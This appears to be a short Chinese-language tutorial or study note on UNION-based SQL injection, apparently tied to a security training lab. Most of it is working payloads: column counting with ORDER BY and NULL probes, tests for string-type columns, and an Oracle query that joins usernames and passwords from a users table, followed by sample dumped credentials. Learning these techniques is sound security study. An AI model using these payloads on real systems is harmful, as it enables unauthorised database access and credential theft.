Union注入

确定所需列数#

有两种方式。一种是order by 3-- ：

1' ORDER BY 1-- 
2' ORDER BY 2-- 
3' ORDER BY 3--

另一种是提交一系列指定不同数量空值的有效载荷：

1' UNION SELECT NULL-- 
2' UNION SELECT NULL,NULL-- 
3' UNION SELECT NULL,NULL,NULL--

如果测试的列数大于实际列数，就会报错

找出字符串数据匹配的列#

想要检索的有趣数据通常是字符串形式。这意味着需要在原始查询结果中找到一个或多个列，其数据类型是字符串数据，或者与字符串数据兼容。 确定所需列数后，可以探测每个列是否能存储字符串数据。提交一系列负载，依次为每列放置字符串值。例如，如果查询返回四列，将提交：

1' UNION SELECT 'a',NULL,NULL,NULL-- 
2' UNION SELECT NULL,'a',NULL,NULL-- 
3' UNION SELECT NULL,NULL,'a',NULL-- 
4' UNION SELECT NULL,NULL,NULL,'a'--

如果列数据类型与字符串数据不兼容，注入查询将引发数据库错误。

一个字段检索出多个值#

在某些情况下，前例中的查询可能只返回一列。例如，已知有两列，只有第二字段是字符串类型，这意味着第一列总是需要用空值来占位。所以不能像之前一样，直接在两列位置查询用户名和密码。 这时可以通过将多个值串接在一起，在这一列内检索多个值。添加分隔符来区分合并后的值。例如，在Oracle上提交以下输入：

1' UNION SELECT username||'~'||password FROM users--

这使用了 Oracle 上的字符串串接算子 double-pipe 序列||。注入查询将username和password字段的值串接在一起，中间用字符~分隔。 查询结果包含所有用户名和密码，例如：

1... 
2administrator~s3cure 
3wiener~peter 
4carlos~montoya 
5...
